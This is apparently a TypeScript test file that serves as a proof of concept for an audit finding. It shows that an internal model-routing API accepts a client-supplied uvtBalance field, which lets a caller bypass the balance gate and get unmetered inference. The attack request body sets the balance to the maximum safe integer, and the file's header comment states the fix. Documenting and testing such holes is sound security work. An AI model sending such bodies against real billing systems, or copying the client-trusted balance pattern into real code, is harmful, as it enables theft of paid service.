import { describe, it, expect, beforeEach, afterAll } from "vitest";
import { POST } from "@/app/api/internal/router/pick/route";
import { setAuditWriter, resetAuditWriter, type RoutingDecisionRow } from "@/lib/router/auditLog";

// ─────────────────────────────────────────────────────────────────
// §2.4 Cap-Evasion PoC — uvtBalance gate bypass via client body.
//
// The route accepts uvtBalance as a Zod-validated body field and uses
// it as the balance ceiling in pick(). There is no server-side lookup
// against uvt_balances. An attacker can attest any positive integer
// (up to Number.MAX_SAFE_INTEGER) and the gate always passes.
//
// Severity: CRITICAL. Unmetered inference on behalf of any user.
// Fix: fetch balance from uvt_balances table server-side; drop the
// client-supplied field.
// ─────────────────────────────────────────────────────────────────

const TOKEN = "poc-token";

function post(body: unknown): Request {
  return new Request("http://localhost/api/internal/router/pick", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-aether-internal": TOKEN,
    },
    body: JSON.stringify(body),
  });
}

beforeEach(() => {
  process.env.AETHER_INTERNAL_SERVICE_TOKEN = TOKEN;
  process.env.AETHER_INTERNAL_SERVICE_TOKEN_PREV = "";
  resetAuditWriter();
});

afterAll(() => {
  delete process.env.AETHER_INTERNAL_SERVICE_TOKEN;
  delete process.env.AETHER_INTERNAL_SERVICE_TOKEN_PREV;
  resetAuditWriter();
});

describe("PoC 2.4 — client-supplied uvtBalance bypasses insufficient_uvt_balance gate", () => {
  it("balance gate passes regardless of real balance", async () => {
    const captured: RoutingDecisionRow[] = [];
    setAuditWriter(async (row) => { captured.push(row); });

    const attackBody = {
      userId: "00000000-0000-0000-0000-0000000000bb",
      tier: "pro",
      taskKind: "chat",
      estimatedInputTokens: 100_000,
      estimatedOutputTokens: 20_000,  // simple cost ≈ 120,000 UVT
      opusPctMtd: 0,
      activeConcurrentTasks: 0,
      uvtBalance: Number.MAX_SAFE_INTEGER,
      requestId: "poc-2-4b",
      traceId: "poc-2-4b",
    };

    const res = await POST(post(attackBody));
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.chosen_model).toBe("claude-sonnet-4");
    expect(body.predicted_uvt_cost_simple).toBe(120_000);

    // Attacker's lied balance is snapshotted into routing_decisions verbatim.
    await new Promise((r) => setImmediate(r));
    expect(captured[0].uvt_balance_snapshot).toBe(Number.MAX_SAFE_INTEGER);
  });
});
